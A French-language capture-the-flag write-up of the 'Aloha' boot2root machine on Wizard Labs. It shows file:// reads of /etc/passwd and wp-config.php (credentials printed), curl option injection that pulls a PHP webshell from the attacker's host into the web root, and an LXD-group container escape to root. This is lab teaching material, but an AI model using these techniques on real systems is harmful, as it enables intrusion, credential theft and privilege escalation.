# Solution du CTF Aloha de Wizard Labs

Paix, amour, liberté et fleurs
------------------------------

*Aloha* est un CTF créé par *m.qt* et proposé sur [Wizard Labs](https://labs.wizard-security.net/).  

Comme de nombreux CTF il s'agit d'un boot2root, l'objectif est donc d'obtenir un accès root sur la machine. Cet accès pouvant être validé via un flag (fichier présent sur la machine), ce qui nécessite les privilèges root sur la machine pour obtenir son contenu.  

La validation de ces flags permettent d'obtenir des points sur la plateforme (*Wizard Labs*). Le principe reste le même que la plupart des writeups écrits sur mon site mais il peut être bon de le rappeler.  

Pour finir on a affaire ici à une machine Linux.  

Un scan rapide des ports TCP nous indique l'existence d'un site web (Sunny Security) et de serveurs mails (SMTP et IMAP) :  

```plain
Nmap scan report for 10.1.1.60
Host is up (0.045s latency).
Not shown: 65528 closed ports
PORT     STATE    SERVICE
22/tcp   open     ssh
| ssh-hostkey:
|   2048 c3:ec:bc:bc:5f:ac:0f:06:1d:f0:b2:78:b6:0c:27:4e (RSA)
|   256 76:6c:9c:95:67:8f:e0:34:34:33:41:ab:0b:58:cc:b1 (ECDSA)
|_  256 e8:bc:7d:ae:9e:f2:f4:77:12:16:73:9a:da:7e:87:5f (ED25519)
80/tcp   open     http
|_http-title: Sunny Security
110/tcp  open     pop3
|_pop3-capabilities: PIPELINING UIDL AUTH-RESP-CODE STLS RESP-CODES TOP CAPA SASL
| ssl-cert: Subject: commonName=aloha
| Subject Alternative Name: DNS:aloha
| Not valid before: 2019-03-20T21:14:39
|_Not valid after:  2029-03-17T21:14:39
|_ssl-date: TLS randomness does not represent time
143/tcp  open     imap
|_imap-capabilities: SASL-IR ID listed capabilities ENABLE Pre-login post-login have STARTTLS IDLE OK LOGIN-REFERRALS LOGINDISABLEDA0001 more IMAP4rev1 LITERAL+
| ssl-cert: Subject: commonName=aloha
| Subject Alternative Name: DNS:aloha
| Not valid before: 2019-03-20T21:14:39
|_Not valid after:  2029-03-17T21:14:39
|_ssl-date: TLS randomness does not represent time
993/tcp  open     imaps
| ssl-cert: Subject: commonName=aloha
| Subject Alternative Name: DNS:aloha
| Not valid before: 2019-03-20T21:14:39
|_Not valid after:  2029-03-17T21:14:39
995/tcp  open     pop3s
| ssl-cert: Subject: commonName=aloha
| Subject Alternative Name: DNS:aloha
| Not valid before: 2019-03-20T21:14:39
|_Not valid after:  2029-03-17T21:14:39
6060/tcp filtered x11
```

Quand on arrive sur le site on trouve un lien vers un blog *Wordpress* contenant ce billet :  

![Wizard Labs CTF Aloha wordpress blog](https://raw.githubusercontent.com/devl00p/blog/master/images/wizard-labs/aloha_blog.png)

On garde en tête le possible nom d'utilisateur *alex* et on se rend sur l'URL mentionnée :  

![Wizard Labs CTF Aloha php scraper vulnerable script](https://raw.githubusercontent.com/devl00p/blog/master/images/wizard-labs/aloha_scaper.png)

On a donc un formulaire qui va charger une URL. Le premier réflexe est de mettre un port en écoute et voir comment est formatée la requête HTTP :  

```plain
$ ncat -l -p 8080 -v
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::8080
Ncat: Listening on 0.0.0.0:8080
Ncat: Connection from 10.1.1.60.
Ncat: Connection from 10.1.1.60:49138.
GET / HTTP/1.1
Host: 10.254.0.29:8080
User-Agent: curl/7.58.0
Accept: */*
```

Nice ! On a ici ce cher ami cURL dont soit le binaire est appelé *directement* via une fonction PHP comme *system()* ou via l'emploi d'une librairie PHP dédiée.  

Dans tous les cas on sait, [comme l'indique la page de manuel](https://linux.die.net/man/1/curl), que cURL supporte différents protocoles et notamment le schéma *file://* :).  

Si on spécifie l'URL *file:///etc/passwd* on obtient ainsi le fichier correspondant avec la liste des utilisateurs (on retrouve le login *alex*).  

Vu qu'ici un Wordpress est installé on va charger l'URL *file:///var/www/html/blog/wp-config.php* contenant les identifiants de connexion à la base de données.  

Deviner le path de ce fichier n'est pas difficile puisque la racine web utilisée est celle que l'on trouve généralement sous Linux (il peut y avoir des variantes avec *htdocs*).  

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpress' );

/** MySQL database password */
define( 'DB_PASSWORD', 'SQLR00T@@' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

Si on regarde le code du scrapper (obtenu de la même façon) on voit qu'il utilise le binaire cURL :  

```php
<?php
$banned_hosts = array();
$banned_hosts[] = "localhost";
$banned_hosts[] = "127.0.0.1";
if (preg_match('/\b'.$_GET['command'].'\b/', 'http') !== false) {
    die('<b><font color="red">ERROR:</b></color> URL must contain http schema');

}
foreach($banned_hosts as $host) {
   if (parse_url($_GET['command'], PHP_URL_HOST) == $host) {
    die('<b><font color="red">ERROR:</b></color> restricted host');
   }
   if (preg_match('/\b'.$_GET['command'].'\b/', $host)) {
        die('<b><font color="red">ERROR:</b></color> restricted host');

    }
}
// ip ranges 127.0.0.1 - 127.255.255.254 also work using ip2long we can use a range
$ip = '2130706433';
$ip2 = '2147483646';
$gethostname = parse_url($_GET['command'], PHP_URL_HOST);
$hostname = gethostbyname($gethostname);
if (ip2long($hostname) <= $ip2 && $ip <= ip2long($hostname)) {
    die('<b><font color="red">ERROR:</b></color> restricted host');

}
system('curl -s ' . escapeshellcmd($_GET['command']) . ' || echo website not found');
?>
```

La fonction *escapeshellcmd()* est suffisamment forte pour échapper correctement les caractères spéciaux du shell (points virgule, backticks, pipe, etc) mais ne considère pas le tiret comme un caractère dangereux.  

Grave erreur puisque l'on peut alors passer des options à cURL et notamment la plus connue : *-o* qui permet d'indiquer où écrire le contenu téléchargé.  

On va donc partager un shell PHP via un serveur web temporaire et le faire rapatrier sur notre victime et passant la chaîne suivante au formulaire :  

```plain
http://10.254.0.29:8000/shell.php -o /var/www/html/devloop.php
```

On obtient ainsi un shell en tant que *www-data* :  

![Wizard Labs CTF Aloha webshell ](https://raw.githubusercontent.com/devl00p/blog/master/images/wizard-labs/aloha_rce.png)

Flowers Powers
--------------

C'est journée portes ouvertes pour ce cher *Alex* :  

```plain
/home/alex:
total 16
drwxr-xr-x 1 alex alex   78 Mar 21 17:53 .
drwxr-xr-x 1 root root   20 Mar 21 00:14 ..
-rw-r--r-- 1 alex alex  220 Mar 21 00:14 .bash_logout
-rw-r--r-- 1 alex alex 3771 Mar 21 00:14 .bashrc
drwxrwxr-x 1 alex alex   48 Mar 21 17:20 .dev
-rw-r--r-- 1 alex alex  807 Mar 21 00:14 .profile
-rw------- 1 alex alex  816 Mar 21 00:16 .viminfo

/home/alex/.dev:
total 12
drwxrwxr-x 1 alex alex   48 Mar 21 17:20 .
drwxr-xr-x 1 alex alex   78 Mar 21 17:53 ..
-rw-r--r-- 1 root root 1675 Mar 21 00:17 id_rsa
-rw-r--r-- 1 root root  392 Mar 21 00:17 id_rsa.pub
-rw-rw-r-- 1 alex alex  246 Mar 21 00:16 note.txt
```

On trouve une note laissée par *Alex* :  

> sunny has asked me to write a scraper, well i thought what better way to be secure? so i isolated it!  
> 
>   
> 
> as sunny told me it's not safe to leave my SSH key on the server, i figured i could leave them here.. how could a container do damage?  
> 
>   
> 
> - alex

Ok, se parler à soit même ça arrive mais carrément se l'écrire il va falloir qu'il consulte ce cher *Alex* :D  

La clé SSH dans le dossier *.dev* permet de nous connecter au système.  

Sans l'intervention d'*Alex* on aurait de toute façon tilté sur le nombre d'interfaces réseau :  

```plain
alex@aloha:~$ ifconfig
ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.1.60  netmask 255.255.255.0  broadcast 10.1.1.255
        inet6 fe80::20c:29ff:fea2:e614  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:a2:e6:14  txqueuelen 1000  (Ethernet)
        RX packets 3905150  bytes 402718138 (402.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3393684  bytes 1812849712 (1.8 GB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 11877  bytes 1096864 (1.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 11877  bytes 1096864 (1.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lxdbr0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.111.212.1  netmask 255.255.255.0  broadcast 0.0.0.0
        inet6 fd42:5578:b81:9fe2::1  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::a445:35ff:fe3d:4f4a  prefixlen 64  scopeid 0x20<link>
        ether fe:d8:75:50:7e:58  txqueuelen 1000  (Ethernet)
        RX packets 2751367  bytes 1416316060 (1.4 GB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3588757  bytes 380879497 (380.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

vethF44XWR: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::fcd8:75ff:fe50:7e58  prefixlen 64  scopeid 0x20<link>
        ether fe:d8:75:50:7e:58  txqueuelen 1000  (Ethernet)
        RX packets 2746717  bytes 1446605782 (1.4 GB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3581476  bytes 374440627 (374.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Le cache ARP contient une adresse concernant l'interface lxdbr0 :  

```plain
cache arp
? (10.111.212.202) at 00:16:3e:7b:9c:22 [ether] on lxdbr0
```

On trouve aussi mention de cette IP dans le fichier /var/www/rule suivant :  

```bash
sudo PORT=80 PUBLIC_IP=192.168.0.176 CONTAINER_IP=10.111.212.202 sudo -E bash -c 'iptables -t nat -I PREROUTING -i eth0 -p TCP -d $PUBLIC_IP --dport $PORT -j DNAT --to-destination $CONTAINER_IP:$PORT -m comment --comment "forward to the Apache2 container"'
```

Ceci explique pourquoi on s'est retrouvé dans le container... Mais comment en sortir ?  

Si notre utilisateur a les idées par très claires en revanche ses GIDs sont plus intéressants :p   

```plain
uid=1000(alex) gid=1000(alex) groups=1000(alex),24(cdrom),30(dip),46(plugdev),119(lpadmin),125(sambashare),997(lxd)
```

Peace on hearth
---------------

On trouve rapidement un article de *Josiah Beverton* expliquant [comment s'échapper du container LXD](https://reboare.github.io/lxd/lxd-escape.html).  

Il suffit donc de reproduire les étapes de l'article. La seule différence c'est que les machines sur ces plateformes de CTF n'ont généralement pas d'accès Internet, il faut donc réutiliser un container déjà présent sur la machine.  

Le principe de l'exploitation est similaire à ce qu'il peut se faire avec Docker : on va créer un nouveau container sur lequel le système de fichier hôte sera accessible en totalité. Une fois dans le container on est en quelque sorte *upgradés* au lieu de *downgradés* :p   

```plain
alex@aloha:/tmp/.devloop$ lxc image list
+-------+--------------+--------+--------------------------------------+--------+----------+------------------------------+
| ALIAS | FINGERPRINT  | PUBLIC |             DESCRIPTION              |  ARCH  |   SIZE   |         UPLOAD DATE          |
+-------+--------------+--------+--------------------------------------+--------+----------+------------------------------+
|       | 86656dfa70d5 | no     | Ubuntu bionic amd64 (20190321_07:42) | x86_64 | 121.43MB | Mar 21, 2019 at 5:59pm (UTC) |
+-------+--------------+--------+--------------------------------------+--------+----------+------------------------------+
|       | f68aac3ef6f1 | no     | Ubuntu bionic i386 (20190321_07:42)  | i686   | 122.70MB | Mar 21, 2019 at 5:59pm (UTC) |
+-------+--------------+--------+--------------------------------------+--------+----------+------------------------------+
alex@aloha:/tmp/.devloop$ lxc init f68aac3ef6f1 devloop -c security.privileged=true
Creating devloop
alex@aloha:/tmp/.devloop$ mkdir yolo
alex@aloha:/tmp/.devloop$ lxc config device add devloop mydevice disk source=/ path=/tmp/.devloop/yolo recursive=true
Device mydevice added to devloop
alex@aloha:/tmp/.devloop$ lxc start devloop
alex@aloha:/tmp/.devloop$ lxc exec devloop bash
root@devloop:~# id
uid=0(root) gid=0(root) groups=0(root)
root@devloop:~# pwd
/root
root@devloop:~# ls -alR
.:
total 8
drwx------ 1 root root   30 Mar 21 07:42 .
drwxr-xr-x 1 root root  122 Mar 25 09:41 ..
-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
root@devloop:~# cd /tmp/.devloop/yolo
root@devloop:/tmp/.devloop/yolo# ls
bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  swapfile  sys  tmp  usr  var  vmlinuz  vmlinuz.old
root@devloop:/tmp/.devloop/yolo# cd root/
root@devloop:/tmp/.devloop/yolo/root# ls
root.txt  snap
root@devloop:/tmp/.devloop/yolo/root# cat root.txt
227bc609651f929e367c3b2b79e09d5b

alex@aloha:/tmp/.devloop$ lxc stop devloop
alex@aloha:/tmp/.devloop$ lxc rm devloop
```

r00ted :)

*Published November 17 2020 at 14:59*